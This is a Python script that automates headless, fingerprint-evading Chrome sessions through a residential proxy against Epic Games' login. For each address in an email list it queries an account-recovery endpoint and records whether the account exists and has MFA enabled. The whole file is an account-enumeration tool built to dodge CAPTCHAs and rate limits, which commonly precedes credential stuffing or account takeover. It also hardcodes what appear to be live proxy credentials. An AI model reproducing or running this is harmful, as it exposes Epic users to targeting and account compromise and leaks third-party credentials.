import time
import json
from fake_useragent import UserAgent
import tempfile
import sys
import os
import random

# --- Start of Critical Diagnostic and Import Section ---
print("--- Starting Python script execution ---", flush=True)
try:
    print("--- Attempting to import libraries ---", flush=True)
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
    from seleniumwire import undetected_chromedriver as uc
    print("✓ All libraries imported successfully.", flush=True)
except ImportError as e:
    print(f"FATAL: A critical library import failed. Error: {e}", flush=True)
    sys.exit(1)

# ==============================================================================
# SCRIPT CONFIGURATION
# ==============================================================================
PROXY_CONFIG = {
    "user": os.environ.get("PROXY_USER", "FFCSEjg822t4ZQxe"),
    "pass": os.environ.get("PROXY_PASS", "oMLjrG7iivzkF1QQ_country-us"),
    "host": os.environ.get("PROXY_HOST", "geo.iproyal.com"),
    "port": int(os.environ.get("PROXY_PORT", 12321))
}
EMAILS_FILE = "emails.txt"
RESULTS_FILE = "results.json"
MIN_DELAY_SECONDS = 2.0
MAX_DELAY_SECONDS = 4.0
# ==============================================================================

def run_browser_session(emails_to_process, all_results, total_emails):
    driver = None
    session_failed = False
    user_data_dir = tempfile.mkdtemp()

    try:
        print("\n" + "="*70, flush=True)
        print("INITIALIZING PROXY-AWARE HEADLESS SESSION...", flush=True)
        print("="*70, flush=True)

        proxy_str = f"socks5://{PROXY_CONFIG['user']}:{PROXY_CONFIG['pass']}@{PROXY_CONFIG['host']}:{PROXY_CONFIG['port']}"
        seleniumwire_options = {
            'proxy': { 'http': proxy_str, 'https': proxy_str, 'no_proxy': 'localhost,127.0.0.1' },
            'verify_ssl': False
        }

        chrome_options = uc.ChromeOptions()
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument(f'--user-agent={UserAgent().random}')
        
        driver = uc.Chrome(options=chrome_options, seleniumwire_options=seleniumwire_options, user_data_dir=user_data_dir)

        target_url = 'https://www.epicgames.com/id/login'
        print(f"Navigating to: {target_url}", flush=True)
        driver.get(target_url)

        try:
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "email")))
            print("✓ Login page loaded successfully. Session is clean.", flush=True)
            xsrf_token = driver.get_cookie('XSRF-TOKEN')['value']
        except TimeoutException:
            print("! CAPTCHA or page load failure. Session will be regenerated.", flush=True)
            return 0, True

        for i, email in enumerate(emails_to_process):
            current_progress = len(all_results) + i + 1
            print(f"\n[Email {current_progress}/{total_emails}] Checking: {email}", flush=True)
            
            email_encoded = email.replace('@', '%40')
            api_url = f'https://www.epicgames.com/id/api/account/recovery/mfa/eligible/{email_encoded}'
            
            script = f"""
                return await fetch('{api_url}', {{
                    "method": "POST",
                    "headers": {{ "Accept": "application/json", "Content-Type": "application/json", "X-XSRF-TOKEN": '{xsrf_token}', "X-Epic-Client-ID": "875a3b57d3a640a6b7f9b4e883463ab4" }},
                    "body": JSON.stringify({{ "email": "{email}" }})
                }}).then(res => res.json()).catch(e => ({{ "error": "JavaScript fetch failed", "message": e.toString() }}));
            """
            api_result = driver.execute_script(script)

            if 'mfaEligible' not in api_result:
                print(f"-> SESSION ERROR: {api_result.get('errorMessage', str(api_result))}. Regenerating session.", flush=True)
                session_failed = True
                break
            else:
                print(f"-> Result: {json.dumps(api_result)}", flush=True)
                all_results.append({"email": email, "result": api_result})
            
            time.sleep(random.uniform(MIN_DELAY_SECONDS, MAX_DELAY_SECONDS))

    except Exception as e:
        print(f"\nA critical error occurred in this session: {e}", flush=True)
        session_failed = True
        
    finally:
        if driver:
            driver.quit()
    
    return len(emails_to_process) if not session_failed else 0, session_failed

def main():
    if not os.path.exists(EMAILS_FILE):
        print(f"FATAL: '{EMAILS_FILE}' not found.", flush=True); return
    with open(EMAILS_FILE, 'r') as f:
        master_email_list = [line.strip() for line in f if line.strip()]
    if not master_email_list:
        print(f"FATAL: '{EMAILS_FILE}' is empty.", flush=True); return

    all_results = []
    total_to_process = len(master_email_list)
    
    while len(all_results) < total_to_process:
        remaining_emails = master_email_list[len(all_results):]
        print("\n" + "#"*70 + f"\nSTARTING BATCH RUN. {len(all_results)} done, {len(remaining_emails)} remaining.\n" + "#"*70, flush=True)
        
        processed, session_failed = run_browser_session(remaining_emails, all_results, total_to_process)
        
        if all_results:
            with open(RESULTS_FILE, 'w') as f: json.dump(all_results, f, indent=2)
            print(f"Progress for {len(all_results)} emails saved to '{RESULTS_FILE}'.", flush=True)
        
        if not session_failed and len(all_results) == total_to_process:
            print("\nAll emails processed successfully!", flush=True); break
        
        if session_failed:
            print("Pausing for 15 seconds before starting a new session...", flush=True); time.sleep(15)

if __name__ == '__main__':
    main()
